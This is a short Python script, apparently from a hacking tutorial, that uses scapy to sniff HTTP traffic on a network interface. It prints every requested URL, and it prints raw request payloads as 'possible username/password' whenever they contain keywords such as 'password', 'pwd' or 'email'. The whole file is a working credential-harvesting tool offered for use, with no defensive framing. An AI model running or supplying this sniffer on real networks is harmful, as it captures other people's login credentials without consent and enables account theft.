#!/usr/bin/env python

import argparse
import scapy.all as scapy
from scapy.layers import http

def get_arguments():
        parser = argparse.ArgumentParser()
        parser.add_argument("-i", "--interface", dest="interface", help="The interface to sniff")
        args = parser.parse_args()
        if not args.interface:
                parser.error("[-] Please give the sniff, use --help for more info")
                exit()
        return args

        

def get_url(packet):
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path



def get_login_info(packet):
        if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load
                keywords = ["username", "password", "pass", "email", "user", "account", "name", "log", "pwd"]
                for keyword in keywords:
                        if keyword in load :
                                return load



def proccess_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url =  get_url(packet)
        print("[+] HTTP Request =>> "+ url)

        login_info = get_login_info(packet)
        if login_info:
                print("\n\n[+] Possible username /password =>> "+ login_info + "\n")



def sniff(interface):
        scapy.sniff(iface=interface, store=False, prn=proccess_packet)


args = get_arguments()
sniff(args.interface)
